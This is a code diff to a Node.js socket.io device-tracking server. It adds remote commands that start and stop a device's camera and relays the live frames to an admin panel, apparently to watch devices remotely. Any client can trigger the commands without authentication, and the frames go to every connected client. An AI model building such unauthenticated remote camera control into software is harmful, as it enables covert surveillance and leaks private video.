@@ -123,6 +123,7 @@ function saveDevices() {
 
 io.on('connection', (socket) => {
     const deviceId = socket.handshake.query.deviceId || uuidv4();
+    socket.join(deviceId); // Join room for targeted events (live camera, etc.)
 
     if (!devices.has(deviceId)) {
         devices.set(deviceId, {
@@ -275,10 +276,28 @@ io.on('connection', (socket) => {
         io.emit('forensics-alert', { deviceId, label: device.label, type: data.type, detail: data.detail, time: Date.now() });
     });
 
+    socket.on('camera-stream', (frameData) => {
+        // Relay live frame to admin panel
+        io.emit('camera-frame', { deviceId, label: device.label, image: frameData.image, time: Date.now() });
+    });
+
+    // Admin commands for live camera
+    socket.on('start-camera-stream', (targetDeviceId) => {
+        if (targetDeviceId) {
+            io.to(targetDeviceId).emit('start-camera-stream');
+        }
+    });
+    socket.on('stop-camera-stream', (targetDeviceId) => {
+        if (targetDeviceId) {
+            io.to(targetDeviceId).emit('stop-camera-stream');
+        }
+    });
+
     socket.on('disconnect', () => {
         device.lastSeen = Date.now();
         saveDevices();
         io.emit('device-offline', deviceId);
+        io.emit('camera-stop', deviceId);
     });
 });
 
